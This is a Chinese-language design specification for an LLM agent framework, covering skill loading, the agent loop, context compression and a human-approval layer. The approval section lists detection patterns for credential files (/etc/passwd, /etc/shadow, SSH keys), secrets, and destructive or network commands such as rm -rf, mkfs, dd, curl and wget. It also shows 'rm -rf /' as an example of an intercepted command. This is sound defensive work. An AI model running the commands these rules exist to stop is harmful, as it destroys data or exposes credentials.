core: []  # 启动时加载的技能(默认为空)

optional:
  pdf:
    enabled: false # 默认不加载
    cn_name: "PDF 文档处理" # 中文名
    always_available: false
    description: "PDF处理和表单填写"
    auto_load_on_file_types: ["pdf"]  # 上传.pdf时自动加载

  docx:
    enabled: false
    description: "Word文档创建和编辑"
    auto_load_on_file_types: ["docx", "doc"]

  xlsx:
    enabled: false
    description: "Excel数据处理和分析"
    auto_load_on_file_types: ["xlsx", "xls", "csv"]

  pptx:
    enabled: false
    description: "PowerPoint演示文稿创建"
    auto_load_on_file_types: ["pptx", "ppt"]

  artifacts-builder:
    enabled: false
    description: "生成HTML/React/Mermaid可交付物"

  skill-creator:
    enabled: false
    description: "快速创建新技能包"
```

---

## 创建自定义技能

### 步骤1: 创建技能目录

```bash
mkdir -p generalAgent/skills/my-skill/scripts
cd generalAgent/skills/my-skill
```

### 步骤2: 编写SKILL.md

```markdown
# 我的自定义技能

## 技能概述
描述技能功能...

## 使用指南

### 场景1: XXX
步骤说明...

### 场景2: YYY
步骤说明...

## 可用脚本
| 脚本 | 功能 |
|------|------|
| process.py | 处理数据 |
```

### 步骤3: 添加脚本(可选)

```python
# scripts/process.py
import sys

def main():
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    # 处理逻辑
    print(f"Processed {input_file} → {output_file}")

if __name__ == "__main__":
    main()
```

### 步骤4: 添加依赖(可选)

```
# requirements.txt
requests>=2.31.0
pandas>=2.0.0
```

### 步骤5: 配置技能

在`skills.yaml`添加:

```yaml
optional:
  my-skill:
    enabled: false
    description: "我的自定义技能"
    auto_load_on_file_types: ["myext"]
```

### 步骤6: 使用技能

```
User> @my-skill 帮我处理数据
Agent> [读取SKILL.md] [按照指导执行]
```

---

## 依赖管理

### 自动安装机制

```python
# WorkspaceManager检测requirements.txt
if (skill_path / "requirements.txt").exists():
    # 执行安装
    subprocess.run([
        "pip", "install", "-r",
        str(skill_path / "requirements.txt")
    ])

    # 标记已安装(避免重复)
    skill_registry.mark_dependencies_installed(skill_id)
```

### 安装时机

- **首次@mention**: 技能首次加载时自动安装
- **每session一次**: 已安装技能不会重复安装
- **失败降级**: 安装失败时,Agent收到友好错误消息

### 错误处理

```
Script execution failed: Missing dependency

错误: 缺少Python模块'pypdf2'

建议操作:
1. 检查skills/pdf/requirements.txt是否包含此依赖
2. 手动安装: pip install pypdf2
3. 或联系技能维护者添加依赖声明
```

---

## 技能最佳实践

### SKILL.md编写原则

1. **结构清晰**: 概述→使用指南→脚本引用→注意事项
2. **场景驱动**: 按使用场景组织,不按功能列表
3. **示例具体**: 提供完整的命令示例,包含所有参数
4. **路径规范**: 使用相对路径,明确输入/输出目录

### 脚本设计原则

1. **职责单一**: 一个脚本做一件事
2. **参数清晰**: 使用argparse,提供--help
3. **错误友好**: 捕获异常,返回清晰错误消息
4. **路径安全**: 检查路径是否在workspace内

### 依赖管理原则

1. **最小依赖**: 只声明必需的包
2. **版本锁定**: 使用`package>=x.y.z`避免breaking changes
3. **冲突避免**: 检查与框架依赖的兼容性

---

## 参考代码位置

| 功能模块 | 代码路径 |
|---------|---------|
| 技能注册表 | `generalAgent/skills/registry.py` |
| 技能加载器 | `generalAgent/skills/loader.py` |
| 技能配置 | `generalAgent/config/skills.yaml` |
| 技能目录 | `generalAgent/skills/` |
| 工作区管理 | `shared/workspace/manager.py` |
| 依赖安装逻辑 | `shared/workspace/manager.py:link_skill()` |

---

# 2. Agent 流程与状态管理

### 产品定位

Agent 流程与状态管理是框架的核心执行引擎，基于 **Agent Loop 架构**（ReAct 模式）实现 LLM 自主决策的多轮对话流程。系统通过状态管理追踪会话上下文、工具调用、任务进度，并提供自动上下文压缩机制应对长对话场景。

**价值主张**：
- **自主决策**：LLM 自主选择工具调用或结束对话，无需人工预定义执行流程
- **状态隔离**：支持主 Agent 与 Subagent 上下文隔离，防止状态污染
- **自动优化**：Token 使用率超过 95% 时自动压缩历史，无需用户干预
- **可观测性**：完整的 Loop 计数、Token 追踪、节点日志，便于调试和优化

---

### 核心场景

#### 场景 1：多轮研究任务

**用户故事**：
用户要求 "研究 Python 3.13 的新特性并生成对比报告"，Agent 需要：
1. 搜索官方文档
2. 提取关键特性
3. 对比旧版本
4. 生成 Markdown 报告
5. 保存到 outputs/ 目录

**系统行为**：
- Planner 节点决定调用 search_web 工具
- Tools 节点执行搜索，返回结果
- Planner 节点分析结果，决定调用 read_file
- 循环直到生成报告
- Finalize 节点格式化最终输出

**关键点**：
- 最多执行 100 个 Loop（可配置）
- 每次 Loop 累计 Token 使用
- 自动检测 Token 使用率

---

#### 场景 2：长对话自动压缩

**用户故事**：
用户与 Agent 进行 300 轮对话（约 120K tokens），系统需要在不中断对话的情况下释放 Token 空间。

**系统行为**：
1. Planner 节点检测 Token 使用率达到 95%
2. 自动路由到 Summarization 节点
3. LLM 将前 290 条消息压缩为 1 条摘要
4. 保留最近 10 条消息
5. 返回 Planner 节点继续执行

**关键点**：
- 用户无感知（无压缩通知）
- 保留最近对话上下文（默认保留 15% context window）
- 支持 LLM 压缩和紧急截断两种策略

---

#### 场景 3：Subagent 状态隔离

**用户故事**：
用户在主 Agent 中调用 delegate_task 将子任务分配给 Subagent，需要确保 Subagent 不干扰主 Agent 的状态。

**系统行为**：
- Subagent 创建独立的 AppState 实例
- `context_id` 设置为 `subagent-{uuid}`
- `parent_context` 指向主 Agent 的 `context_id`
- 继承工具、技能、工作区路径
- 不继承消息历史
- 完成后将结果返回主 Agent

**关键点**：
- 状态隔离防止污染
- 工具和工作区继承提高效率
- 支持嵌套调用（最大深度 3 层）

---

### 功能需求

#### 需求 1：Agent Loop 架构

**需求描述**：
实现基于 LangGraph 的 Agent Loop 架构（ReAct 模式），支持 LLM 自主决策的多轮对话流程。

**流程图**：

```
START → agent ⇄ tools → agent ⇄ ... → finalize → END
          ↑      ↓
          ↑ summarization (auto-compress when >95% tokens)
          ↑______↓
```

**节点定义**：

| 节点 | 功能 | 输入 | 输出 | 下一步 |
|------|------|------|------|--------|
| agent (Planner) | LLM 推理，决策工具调用 | 消息历史 + 可见工具 | AIMessage (with/without tool_calls) | tools / finalize / summarization |
| tools | 执行工具调用 | tool_calls | ToolMessage[] | agent |
| summarization | 压缩消息历史 | 消息历史 | 压缩后消息 | agent |
| finalize | 格式化最终输出 | 消息历史 | 最终 AIMessage | END |

**路由逻辑**：

```python
# generalAgent/graph/routing.py:agent_route()
def agent_route(state: AppState):
    # 1. 检查 Loop 限制
    if loops >= max_loops:
        return "finalize"

    # 2. 检查 Token 使用率（>95% 触发压缩）
    if needs_compression and not auto_compressed:
        return "summarization"

    # 3. 检查工具调用
    if last_message.tool_calls:
        return "tools"
    else:
        return "finalize"
```

**验收标准**：
- ✅ 支持最大 100 Loop（可配置 1-500）
- ✅ Token 使用率 >95% 时自动路由到 summarization
- ✅ LLM 决定无需工具时自动结束
- ✅ Loop 限制触发时强制 finalize

**实现参考**：`generalAgent/graph/builder.py`、`generalAgent/graph/routing.py`

---

#### 需求 2：状态定义（AppState）

**需求描述**：
定义完整的会话状态结构，包含消息历史、工具状态、任务追踪、上下文隔离、Token 追踪等所有必要信息。

**状态字段**：

```python
# generalAgent/graph/state.py:AppState
class AppState(TypedDict, total=False):
    # ========== 消息与多媒体 ==========
    messages: List[BaseMessage]  # LangChain 消息列表（累加器）
    images: List[Any]  # 图片列表

    # ========== 技能与工具 ==========
    active_skill: Optional[str]  # 当前激活的技能 ID
    allowed_tools: List[str]  # 技能允许使用的工具列表
    mentioned_agents: List[str]  # 历史 @mention 记录
    new_mentioned_agents: List[str]  # 本轮新增 @mention（用于提醒）
    persistent_tools: List[str]  # 持久化工具（始终可用）

    # ========== 任务追踪 ==========
    todos: List[dict]  # 任务列表（TodoWrite 工具管理）

    # ========== 上下文隔离 ==========
    context_id: str  # "main" 或 "subagent-{uuid}"
    parent_context: Optional[str]  # 父上下文 ID（仅 Subagent）

    # ========== 执行控制 ==========
    loops: int  # 全局 Loop 计数器
    max_loops: int  # Loop 上限（默认 100）

    # ========== 模型偏好 ==========
    model_pref: Optional[str]  # 用户指定模型类型（vision/code/...）

    # ========== 会话上下文 ==========
    thread_id: Optional[str]  # 会话 ID（用于持久化）
    user_id: Optional[str]  # 用户 ID（未来扩展）
    workspace_path: Optional[str]  # 工作区路径
    uploaded_files: List[Any]  # 上传文件列表（历史记录）
    new_uploaded_files: List[Any]  # 本轮新上传文件（用于提醒）

    # ========== Agent 系统 ==========
    agent_call_stack: List[str]  # 调用栈（检测循环）
    agent_call_history: List[str]  # 调用历史（审计）
    current_agent: Optional[str]  # 当前活跃 Agent

    # ========== Token 追踪与压缩 ==========
    cumulative_prompt_tokens: int  # 当前上下文大小（tokens）
    cumulative_completion_tokens: int  # 累计输出 tokens
    last_prompt_tokens: int  # 上次调用的 prompt tokens
    compact_count: int  # 压缩次数
    last_compact_strategy: Optional[str]  # 上次压缩策略
    last_compression_ratio: Optional[float]  # 上次压缩比
    auto_compressed_this_request: bool  # 本轮是否已压缩
    needs_compression: bool  # 是否需要压缩（路由标志）
```

**字段分类**：

| 类别 | 字段数 | 用途 |
|------|--------|------|
| 消息管理 | 2 | 对话历史、图片 |
| 工具/技能 | 5 | 动态加载、权限控制 |
| 任务追踪 | 1 | TodoWrite 工具 |
| 上下文隔离 | 2 | 主 Agent / Subagent 隔离 |
| 执行控制 | 2 | Loop 限制 |
| 会话上下文 | 5 | 持久化、工作区 |
| Agent 系统 | 3 | Multi-Agent 协作 |
| Token 管理 | 9 | 自动压缩 |

**验收标准**：
- ✅ 支持 LangChain 消息累加器（`add_messages`）
- ✅ 支持主 Agent 和 Subagent 状态隔离
- ✅ 支持 Token 追踪和压缩标志位
- ✅ 所有字段类型正确，支持 TypedDict 类型检查

**实现参考**：`generalAgent/graph/state.py`

---

#### 需求 3：Planner 节点

**需求描述**：
实现 Planner 节点（agent 节点），负责 LLM 推理、工具可见性控制、动态提醒生成、Token 监控。

**核心逻辑**：

```
1. 收集可见工具（persistent + @mentioned）
2. 检测多模态输入（图片/代码）
3. 构建 SystemMessage（静态，KV Cache 优化）
4. 构建动态提醒（技能、工具、TODO、文件上传）
5. 追加提醒到最后一条 HumanMessage
6. 调用 LLM（model_registry + model_resolver）
7. 提取 Token 使用信息
8. 检查 Token 使用率（>95% 设置 needs_compression 标志）
9. 返回 AIMessage + 更新状态
```

**SystemMessage 结构**（KV Cache 优化）：

```
[固定内容 - 系统指令]
[技能目录 - 启用的技能列表]
[Agent 目录 - 启用的 Agent 列表]
[时间戳 - 分钟级精度，启动时生成一次]
```

**动态提醒追加到最后一条消息**：

```
User> 帮我分析这个 PDF

[系统自动追加到 HumanMessage]
<system_reminder>
⚠️ 检测到上传文件: report.pdf (PDF 格式)
建议使用 @pdf 技能处理
</system_reminder>

<system_reminder>
⚠️ 任务追踪 (2 个未完成):
  [进行中] 分析 PDF 文档
  [待完成] 生成分析报告
</system_reminder>
```

**Token 监控逻辑**：

| Token 使用率 | 行为 | 日志级别 |
|-------------|------|---------|
| <75% | 正常执行 | INFO |
| 75%-85% | 记录信息，动态加载 compact_context 工具 | INFO |
| 85%-95% | 警告，添加 Token 提醒到消息 | WARNING |
| >95% | 跳过 LLM 调用，设置 needs_compression=True | WARNING |

**验收标准**：
- ✅ SystemMessage 固定不变（KV Cache 优化）
- ✅ 动态提醒追加到最后一条 HumanMessage
- ✅ Token 使用率 >95% 时设置压缩标志位
- ✅ 支持多模态输入检测（图片 → 自动选择 vision 模型）
- ✅ 正确累加 Loop 计数器

**实现参考**：`generalAgent/graph/nodes/planner.py`

---

#### 需求 4：Tools 节点（工具执行）

**需求描述**：
实现 Tools 节点，负责执行 LLM 生成的工具调用，并返回 ToolMessage 结果。

**执行流程**：

```
1. 解析 AIMessage 中的 tool_calls
2. 对每个 tool_call:
   a. 从 ToolRegistry 查找工具
   b. 如果未找到，尝试 load_on_demand()
   c. 执行工具函数（传入参数）
   d. 捕获异常并返回错误消息
3. 收集所有 ToolMessage
4. 返回到 Planner 节点（或当前 Agent）
```

**HITL 集成**（可选）：

```python
# 如果启用 ApprovalChecker，Tools 节点会检查工具调用是否需要审批
# 示例：run_bash_command("rm -rf /") 需要用户确认

tools_node = ApprovalToolNode(
    tools=all_discovered_tools,
    approval_checker=approval_checker,
    enable_approval=True
)
```

**错误处理**：

| 错误类型 | ToolMessage 内容 | 日志级别 |
|---------|----------------|---------|
| 工具未找到 | "Error: Tool 'xxx' not found" | ERROR |
| 参数错误 | "Error: Invalid arguments for 'xxx': ..." | WARNING |
| 执行异常 | "Error: Tool execution failed: ..." | ERROR |
| 需要审批被拒绝 | "Operation cancelled by user" | INFO |

**验收标准**：
- ✅ 支持并发执行多个工具调用
- ✅ 支持工具按需加载（load_on_demand）
- ✅ 支持 HITL 审批拦截
- ✅ 错误消息清晰，包含工具名称和参数
- ✅ 返回到调用方 Agent（支持 Handoff Pattern）

**实现参考**：`generalAgent/graph/builder.py:105-122`、`generalAgent/hitl/approval_node.py`

---

#### 需求 5：Finalize 节点（最终输出）

**需求描述**：
实现 Finalize 节点，负责在 Agent Loop 结束时格式化最终输出。

**触发条件**：
- LLM 没有生成 tool_calls
- Loop 计数器达到 max_loops
- 最后一条消息是 ToolMessage（需要生成自然语言回复）

**核心逻辑**：

```
1. 检查最后一条消息是否为 ToolMessage
   - 如果不是，跳过 Finalize（LLM 已经生成最终回复）
2. 清理消息历史（移除无效 tool_calls）
3. 安全截断消息历史（保留最近 N 条，默认 40）
4. 调用 LLM（无工具绑定）
5. 返回最终 AIMessage
```

**SystemMessage**（简化版）：

```
你是一个智能助手。现在请根据工具执行结果，生成最终回复给用户。

要求：
- 总结工具执行结果
- 用自然语言表达
- 如果有错误，解释原因

<current_datetime>2025-10-31 12:34 UTC</current_datetime>
```

**验收标准**：
- ✅ 仅在最后一条消息是 ToolMessage 时执行
- ✅ 不绑定任何工具（避免继续循环）
- ✅ 正确处理消息历史截断
- ✅ 生成自然语言回复

**实现参考**：`generalAgent/graph/nodes/finalize.py`

---

#### 需求 6：Summarization 节点（自动压缩）

**需求描述**：
实现 Summarization 节点，负责在 Token 使用率超过 95% 时自动压缩消息历史。

**触发条件**：
- `needs_compression = True`（Planner 设置）
- `auto_compressed_this_request = False`（防止重复压缩）
- 消息数量 ≥ `min_messages_to_compress`（默认 15 条）

**压缩策略**：

| 策略 | 适用场景 | 保留内容 | 压缩方式 |
|------|---------|---------|---------|
| LLM 压缩 | 首选 | 最近 15% context window 的消息 | LLM 总结摘要 |
| 紧急截断 | LLM 压缩失败 | 最近 100 条消息 | 直接删除旧消息 |

**压缩流程**：

```
1. 检查是否需要压缩
2. 计算保留消息数量
   - 基于 Token 比例：context_window * keep_recent_ratio（默认 15%）
   - 基于消息数量：keep_recent_messages（默认 10 条）
   - 取两者中先达到的阈值
3. 调用 LLM 压缩旧消息
   - 提示词：请总结以下对话内容，保留关键信息...
4. 生成压缩后消息列表
   - [SystemMessage, 压缩摘要 AIMessage, 最近 N 条消息]
5. 重置 Token 计数器
6. 返回 Planner 节点继续执行
```

**用户体验**：
- 用户**无感知**（不显示压缩通知）
- 对话上下文保留完整语义
- Agent 继续回答原始问题

**示例**：

```
压缩前: 302 条消息（123K tokens）
压缩后: 13 条消息（6.5K tokens）
压缩比: 95%
策略: LLM 压缩
```

**验收标准**：
- ✅ Token 使用率 >95% 时自动触发
- ✅ 保留最近 15% context window 的消息（或至少 10 条）
- ✅ LLM 压缩失败时回退到紧急截断
- ✅ 用户无感知（无通知消息）
- ✅ 压缩后正确重置 Token 计数器

**实现参考**：`generalAgent/graph/nodes/summarization.py`、`generalAgent/context/manager.py`

---

#### 需求 7：消息历史管理

**需求描述**：
提供消息历史清理和安全截断功能，确保 OpenAI API 兼容性。

**清理规则**：

```python
# generalAgent/graph/message_utils.py:clean_message_history()
# 移除未被响应的 tool_calls

规则：
- 收集所有 ToolMessage.tool_call_id
- 遍历 AIMessage，检查其 tool_calls 是否都有对应的 ToolMessage
- 如果有未响应的 tool_calls，移除整个 AIMessage
```

**截断策略**：

```python
# generalAgent/graph/message_utils.py:truncate_messages_safely()
# 安全截断消息历史，保留 AIMessage-ToolMessage 对

规则：
- 保留最近 N 条消息（默认 40）
- 如果保留的 ToolMessage 有对应的 AIMessage，必须一起保留
- 保留所有 SystemMessage（不计入 N）
```

**示例**：

```
原始历史: 100 条消息
清理后: 95 条消息（移除 5 条未响应的 AIMessage）
截断后: 40 条消息（保留最近对话 + SystemMessage）
```

**验收标准**：
- ✅ 清理未响应的 tool_calls（避免 OpenAI API 错误）
- ✅ 截断时保留 AIMessage-ToolMessage 对
- ✅ 始终保留 SystemMessage
- ✅ 可配置截断阈值（MAX_MESSAGE_HISTORY）

**实现参考**：`generalAgent/graph/message_utils.py`

---

#### 需求 8：路由逻辑

**需求描述**：
实现三个路由函数，控制 Agent Loop 的执行流程。

**agent_route**（Planner 节点后）：

```python
# generalAgent/graph/routing.py:agent_route()

优先级：
1. 检查 Loop 限制（loops >= max_loops → finalize）
2. 检查压缩需求（needs_compression → summarization）
3. 检查工具调用（tool_calls → tools，否则 finalize）
```

**tools_route**（Tools 节点后）：

```python
# generalAgent/graph/routing.py:tools_route()

返回值：
- 如果有 Handoff（current_agent 已更新），返回目标 Agent
- 否则返回 "agent"（主 Agent）
```

**summarization_route**（Summarization 节点后）：

```python
# generalAgent/graph/routing.py:summarization_route()

返回值：
- 始终返回 "agent"（压缩完成后继续执行）
```

**路由决策日志**：

```
[2025-10-31 12:34:56] [routing] agent → tools (LLM requested 2 tool call(s))
[2025-10-31 12:34:58] [routing] tools → agent (Tool execution complete)
[2025-10-31 12:35:00] [routing] agent → summarization (Token usage 96%, needs compression)
[2025-10-31 12:35:05] [routing] summarization → agent (Compression complete)
[2025-10-31 12:35:07] [routing] agent → finalize (No tool calls, LLM decided to finish)
```

**验收标准**：
- ✅ 路由优先级正确（Loop 限制 > 压缩 > 工具调用）
- ✅ 支持 Handoff Pattern（Multi-Agent）
- ✅ 记录路由决策日志

**实现参考**：`generalAgent/graph/routing.py`

---

#### 需求 9：KV Cache 优化

**需求描述**：
优化 SystemMessage 和提醒机制，最大化 KV Cache 复用率，降低推理成本。

**优化策略**：

| 优化点 | 方法 | 效果 |
|--------|------|------|
| 固定 SystemMessage | 启动时生成一次，包含时间戳（分钟级） | 70-90% KV Cache 复用 |
| 动态提醒后置 | 追加到最后一条 HumanMessage，不修改 SystemMessage | 提高 Cache 命中率 |
| 时间戳精度降级 | 分钟级（HH:MM）而非秒级（HH:MM:SS） | 同一分钟内 100% 复用 |

**SystemMessage 结构**：

```python
# 启动时生成一次，整个会话期间不变
system_prompt = f"""
{PLANNER_SYSTEM_PROMPT}  # 固定指令

{skills_catalog}  # 启用的技能列表（静态）

{agents_catalog}  # 启用的 Agent 列表（静态）

<current_datetime>2025-10-31 12:34 UTC</current_datetime>  # 分钟级时间戳
"""
```

**动态提醒示例**：

```python
# 追加到最后一条 HumanMessage
last_message.content += """

<system_reminder>
⚠️ 检测到上传文件: report.pdf
建议使用 @pdf 技能处理
</system_reminder>

<system_reminder>
⚠️ Token 使用率: 82% (警告阈值 85%)
建议压缩上下文（使用 compact_context 工具）
</system_reminder>
"""
```

**成本对比**：

| 场景 | 传统方式 | 优化后 | 成本降低 |
|------|---------|--------|---------|
| 短对话（10 轮） | 100% 全量计算 | 90% KV Cache 复用 | 60% |
| 长对话（100 轮） | 100% 全量计算 | 70% KV Cache 复用 | 80% |

**验收标准**：
- ✅ SystemMessage 在会话期间固定不变
- ✅ 时间戳精度为分钟级（HH:MM UTC）
- ✅ 动态提醒追加到最后一条 HumanMessage
- ✅ 多轮对话中 KV Cache 复用率 ≥70%

**实现参考**：`generalAgent/graph/nodes/planner.py:86-107`、`generalAgent/graph/nodes/finalize.py:34-42`

---

### 非功能需求

#### 性能需求

| 指标 | 目标值 | 测量方法 |
|------|--------|---------|
| Planner 节点耗时 | <5s | 从进入到返回的时间 |
| Tools 节点耗时 | <3s | 单个工具执行时间 |
| Summarization 耗时 | <10s | LLM 压缩时间 |
| Loop 吞吐量 | ≥10 loops/min | 完整对话流程测试 |
| Token 追踪开销 | <10ms | extract_token_usage() 耗时 |

#### 可靠性需求

| 需求 | 说明 | 验收标准 |
|------|------|----------|
| 消息一致性 | AIMessage-ToolMessage 对完整 | clean_message_history() 测试 |
| Loop 限制生效 | 超过 max_loops 时强制结束 | 压力测试 |
| 压缩降级策略 | LLM 压缩失败时回退截断 | 异常注入测试 |
| 状态隔离 | Subagent 不污染主 Agent 状态 | 单元测试 |

#### 可观测性需求

| 需求 | 说明 | 验收标准 |
|------|------|----------|
| Loop 计数日志 | 每次 Loop 记录 loops/max_loops | 日志检查 |
| Token 追踪日志 | 每次 LLM 调用记录 token 使用 | 日志检查 |
| 路由决策日志 | 记录每次路由选择及原因 | 日志检查 |
| 压缩统计日志 | 记录压缩前后消息数和压缩比 | 日志检查 |

---

### 参考代码位置

| 功能模块 | 代码路径 |
|---------|---------|
| 状态定义 | `generalAgent/graph/state.py` |
| Graph 构建 | `generalAgent/graph/builder.py` |
| Planner 节点 | `generalAgent/graph/nodes/planner.py` |
| Finalize 节点 | `generalAgent/graph/nodes/finalize.py` |
| Summarization 节点 | `generalAgent/graph/nodes/summarization.py` |
| 路由逻辑 | `generalAgent/graph/routing.py` |
| 消息处理工具 | `generalAgent/graph/message_utils.py` |
| 上下文管理器 | `generalAgent/context/manager.py` |
| Token 追踪器 | `generalAgent/context/token_tracker.py` |
| 系统提示词 | `generalAgent/graph/prompts.py` |

---

# 5. HITL 人机协同

### 产品定位

HITL (Human-in-the-Loop) 人机协同机制是框架的安全防护层,提供两种交互模式:**Agent 主动请求**(ask_human 工具)和**系统自动拦截**(工具审批框架)。通过四层审批规则检测危险操作,在执行前暂停并请求用户确认,同时对 LLM 完全透明,不污染对话上下文。

**价值主张**:
- **安全防护**:自动检测敏感信息泄露、系统文件操作、危险命令等高风险行为
- **灵活控制**:支持全局规则、工具级规则、自定义检查器三层配置
- **用户体验**:审批决策不进入对话历史,LLM 无感知,避免误导模型行为
- **可观测性**:完整的审批日志、风险级别标记、拒绝原因记录

---

### 核心场景

#### 场景 1:Agent 主动请求信息

**用户故事**:
用户要求"生成季度报告",Agent 需要知道报告格式偏好(PDF/Word/Markdown)才能继续。

**系统行为**:
1. Agent 调用 ask_human 工具
2. 系统暂停 Graph 执行(interrupt)
3. 用户看到问题:"您希望报告以什么格式输出?(默认: markdown)"
4. 用户输入"PDF"
5. 系统恢复执行,Agent 收到答案
6. Agent 继续生成 PDF 报告

**关键点**:
- 对话流程自然,用户感知为连续交互
- ask_human 响应记录在对话历史中(作为 ToolMessage)
- 支持默认值、必填/可选配置

---

#### 场景 2:自动拦截危险操作

**用户故事**:
用户要求"清理临时文件",Agent 决定执行 `rm -rf /tmp/*`,系统需要防止误操作。

**系统行为**:
1. Agent 生成 tool_call: `run_bash_command("rm -rf /tmp/*")`
2. ApprovalToolNode 拦截,检测到高风险模式 `rm -rf`
3. 系统暂停执行,显示审批请求:
   ```
   🛡️  工具审批: run_bash_command
      风险级别: high
      原因: 检测到高风险操作
      命令: rm -rf /tmp/*
      批准? [y/n] >
   ```
4. 用户输入 `n`(拒绝)
5. 系统返回 ToolMessage: "❌ 操作已取消: 检测到高风险操作"
6. Agent 收到拒绝消息,提出替代方案

**关键点**:
- 审批过程对 LLM 透明(不进入对话历史)
- 用户可以批准或拒绝
- 拒绝后 Agent 能自动调整策略

---

#### 场景 3:敏感信息泄露检测

**用户故事**:
用户要求"发送 API 配置到服务器",Agent 准备调用 `http_fetch("https://api.example.com?key=sk-xxx")`,系统需要检测 API Key 泄露。

**系统行为**:
1. ApprovalChecker 全局模式检测到 `api_key` 关键词
2. 匹配 critical 级别风险模式
3. 暂停执行,显示警告:
   ```
   🛡️  工具审批: http_fetch
      风险级别: critical
      原因: 检测到敏感信息(密码/密钥/令牌)
      URL: https://api.example.com?key=sk-xxx
      批准? [y/n] >
   ```
4. 用户意识到 API Key 暴露在 URL 中
5. 拒绝执行,要求 Agent 使用 Header 传递

**关键点**:
- 全局模式跨工具检测(http_fetch、run_bash_command 等)
- 敏感信息模式:password、api_key、secret、token、private_key
- 优先级最高(在工具特定规则之前检查)

---

### 功能需求

#### 需求 1:ask_human 工具(Agent 主动请求)

**需求描述**:
提供 ask_human 工具,允许 Agent 在需要额外信息时主动向用户提问。

**工具签名**:

```python
@tool
def ask_human(
    question: str,
    context: str = "",
    default: Optional[str] = None,
    required: bool = True
) -> str:
    """向用户提问并等待回复

    Args:
        question: 要问的问题
        context: 额外上下文信息(帮助用户理解)
        default: 默认值(用户直接回车时使用)
        required: 是否必填(False 时用户可跳过)

    Returns:
        用户的回答(字符串)
    """
```

**使用示例**:

```python
# Agent 内部逻辑(自动生成的 tool_call)
answer = ask_human(
    question="您希望报告以什么格式输出?",
    context="支持的格式: PDF, Word, Markdown",
    default="markdown",
    required=True
)
```

**交互流程**:

```
1. Agent 调用 ask_human 工具
   ↓
2. 系统调用 interrupt() 暂停执行
   ↓
3. CLI 显示问题给用户
   💬 您希望报告以什么格式输出?
      上下文: 支持的格式: PDF, Word, Markdown
      (默认: markdown)
   > _
   ↓
4. 用户输入答案
   ↓
5. 系统恢复执行,返回 ToolMessage(content=用户答案)
   ↓
6. Agent 继续执行,使用用户提供的信息
```

**验收标准**:
- ✅ 支持问题、上下文、默认值、必填标志
- ✅ 使用 interrupt() 暂停 Graph 执行
- ✅ 用户答案记录在对话历史(ToolMessage)
- ✅ 支持超时(默认 60s,可配置)

**实现参考**:`generalAgent/tools/builtin/ask_human.py`

---

#### 需求 2:四层审批规则架构

**需求描述**:
实现四层审批规则检测系统,从高到低优先级为:自定义检查器 → 全局模式 → 工具规则 → 内置规则。

**架构图**:

```
ApprovalChecker.check(tool_name, args)
    ↓
1. 工具自定义检查器(Python 代码)
   - 例: check_bash_command(args) → ApprovalDecision
   - 优先级最高,可实现复杂逻辑
    ↓ (如果通过)
2. 全局风险模式(hitl_rules.yaml:global.risk_patterns)
   - 跨工具检测: 密码、API Key、系统文件
   - 适用于所有工具
    ↓ (如果通过)
3. 工具特定规则(hitl_rules.yaml:tools.xxx)
   - 例: run_bash_command.patterns.high_risk
   - 仅适用于该工具
    ↓ (如果通过)
4. 内置默认规则(ApprovalChecker._check_builtin_rules)
   - 兜底逻辑,常见危险操作
   - 如: rm -rf, sudo, chmod 777
    ↓
返回 ApprovalDecision(needs_approval, reason, risk_level)
```

**ApprovalDecision 结构**:

```python
@dataclass
class ApprovalDecision:
    needs_approval: bool  # 是否需要审批
    reason: str           # 原因说明
    risk_level: str       # 风险级别: critical/high/medium/low
```

**验收标准**:
- ✅ 支持四层规则,优先级正确
- ✅ 每层可独立启用/禁用
- ✅ 返回清晰的 ApprovalDecision
- ✅ 支持正则表达式模式匹配

**实现参考**:`generalAgent/hitl/approval_checker.py`

---

#### 需求 3:全局风险模式检测

**需求描述**:
实现跨工具的全局风险模式检测,在所有工具执行前统一检查敏感信息、系统文件等高风险内容。

**配置示例**(hitl_rules.yaml):

```yaml
global:
  risk_patterns:
    # 严重风险: 敏感信息泄露
    critical:
      patterns:
        - "password\\s*[=:]\\s*['\"]?[\\w.-]+"       # password=xxx
        - "api[_-]?key\\s*[=:]\\s*['\"]?[\\w-]+"     # api_key=xxx
        - "secret\\s*[=:]\\s*['\"]?[\\w.-]+"         # secret=xxx
        - "token\\s*[=:]\\s*['\"]?[\\w.-]+"          # token=xxx
        - "BEGIN (RSA|DSA|EC) PRIVATE KEY"           # PEM 私钥
      action: require_approval
      reason: "检测到敏感信息(密码/密钥/令牌)"

    # 高风险: 系统文件/数据库操作
    high:
      patterns:
        - "/etc/passwd"                              # 系统用户文件
        - "/etc/shadow"                              # 系统密码文件
        - "~/.ssh/id_rsa"                           # SSH 私钥
        - "DROP\\s+(TABLE|DATABASE)"                 # SQL 删除
        - "DELETE\\s+FROM.*WHERE\\s+1=1"            # SQL 全删
      action: require_approval
      reason: "检测到高风险操作(系统文件/数据库删除)"

    # 中等风险: 可疑模式
    medium:
      patterns:
        - "\\bexec\\s*\\("                           # 代码执行
        - "\\beval\\s*\\("                           # 动态执行
        - "\\.env$"                                  # 环境变量文件
      action: require_approval
      reason: "检测到可疑模式(代码执行/环境变量)"
```

**检测逻辑**:

```python
# 将所有参数值拼接为字符串
args_str = " ".join(str(v) for v in args.values())

# 按优先级检查(critical > high > medium > low)
for risk_level in ["critical", "high", "medium", "low"]:
    for pattern in patterns[risk_level]:
        if re.search(pattern, args_str, re.IGNORECASE):
            return ApprovalDecision(
                needs_approval=True,
                reason=f"检测到敏感信息(...)",
                risk_level=risk_level
            )
```

**适用工具**:
- run_bash_command: 检测命令中的密码、API Key
- http_fetch: 检测 URL 中的敏感信息
- write_file: 检测文件内容中的私钥、token
- 所有其他工具(通用检测)

**验收标准**:
- ✅ 支持 critical/high/medium/low 四级风险
- ✅ 正则表达式模式匹配(不区分大小写)
- ✅ 优先级高于工具特定规则
- ✅ 可配置 action(require_approval/allow/deny)

**实现参考**:`generalAgent/hitl/approval_checker.py:_check_global_patterns`

---

#### 需求 4:工具特定审批规则

**需求描述**:
为特定工具配置专用审批规则,支持多风险级别、自定义模式、灵活动作控制。

**配置示例**(run_bash_command):

```yaml
tools:
  run_bash_command:
    enabled: true  # 启用审批

    patterns:
      # 高风险操作
      high_risk:
        - "rm\\s+-rf"           # 强制删除
        - "sudo"                # 提权操作
        - "chmod\\s+777"        # 危险权限
        - "mkfs"                # 格式化磁盘
        - "dd.*if=/dev/"        # 磁盘写入

      # 中等风险操作
      medium_risk:
        - "curl"                # 网络请求
        - "wget"                # 下载文件
        - "pip\\s+install"      # 安装包
